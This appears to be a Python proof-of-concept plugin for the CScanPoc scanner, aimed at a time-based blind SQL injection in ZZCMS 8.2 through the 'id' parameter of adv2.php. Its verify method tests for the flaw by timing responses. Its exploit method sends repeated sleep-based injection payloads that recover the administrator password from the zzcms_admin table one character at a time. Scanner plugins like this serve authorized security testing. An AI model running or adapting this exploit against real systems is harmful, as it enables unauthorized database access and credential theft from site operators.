# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import time


class Vuln(ABVuln):
    vuln_id = 'ZZCMS_0004_L'  # 平台漏洞编号，留空
    name = 'zzcms SQL注入漏洞'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2018-03-26'  # 漏洞公布时间
    desc = '''
        ZZCMS是一款集成app移动平台与电子商务平台的内容管理系统。
        ZZCMS 8.2版本中存在安全漏洞。攻击者可借助adv2.php?action=modify请求中的‘id’参数利用该漏洞注入SQL命令，获取密码。
    '''  # 漏洞描述
    ref = 'http://www.cnvd.org.cn/flaw/show/CNVD-2018-06859'  # 漏洞来源
    cnvd_id = 'CNVD-2018-06859'  # cnvd漏洞编号
    cve_id = 'CVE-2018-8967 '  # cve编号
    product = 'ZZCMS'  # 漏洞应用名称
    product_version = '8.2'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'b8d19d5c-2b5b-4975-b209-1a1e98a5ba84'
    author = '47bwy'  # POC编写者
    create_date = '2018-07-10'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # 首先注册用户。
            # 获取cookies
            cookies = {}
            '''
            raw_cookies = 'bid=xxxxx;_pk_ref.100001.8cb4=xxxxxxx;__utma=xxxxx'
            for line in raw_cookies.split(';'):  
                key,value=line.split('=',1)#1代表只分一次，得到两个数据  
                cookies[key]=value 
            '''
            s = requests.session()
            s.get(self.target)
            payload = '/user/adv2.php?action=modify'
            cookies = {
                'UserName': 'test2'
            }
            flag = ''
            data_sleep = {
                'id': '0 or if((select ascii(substr(pass,1,1)) from zzcms_admin)=33,sleep(5),0)'
            }

            data_normal = {
                'id': '0 or if((select ascii(substr(pass,1,1)) from zzcms_admin)=33,md5(c),0)'
            }
            url = self.target + payload
            time_start = time.time()
            s.post(url, data=data_normal)
            time_end_normal = time.time()
            s.post(url, data=data_sleep)
            time_end_sleep = time.time()

            if (time_end_sleep-time_end_normal) - (time_end_normal-time_start) > 4:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # 首先注册用户。
            # 获取cookies
            cookies = {}
            '''
            raw_cookies = 'bid=xxxxx;_pk_ref.100001.8cb4=xxxxxxx;__utma=xxxxx'
            for line in raw_cookies.split(';'):  
                key,value=line.split('=',1)#1代表只分一次，得到两个数据  
                cookies[key]=value 
            '''
            s = requests.session()
            s.get(self.target)
            payload = '/user/adv2.php?action=modify'
            url = self.target + payload
            cookies = {
                'UserName': 'test2'
            }
            flag = ''
            for i in range(1, 40):
                for j in range(33, 125):
                    data = {
                        'id': '0 or if((select ascii(substr(pass,{},1)) from zzcms_admin)={},sleep(3),0)'.format(i, j)
                    }
                    # print data
                    r = s.post(url, data=data, cookies=cookies)
                    # print r.text
                    sec = r.elapsed.seconds
                    # print i,j,sec
                    if sec > 2:
                        flag += chr(j)
                        print(flag)
                        break
            print(flag)

        except Exception as e:
            self.output.info('执行异常{}'.format(e))


if __name__ == '__main__':
    Poc().run()
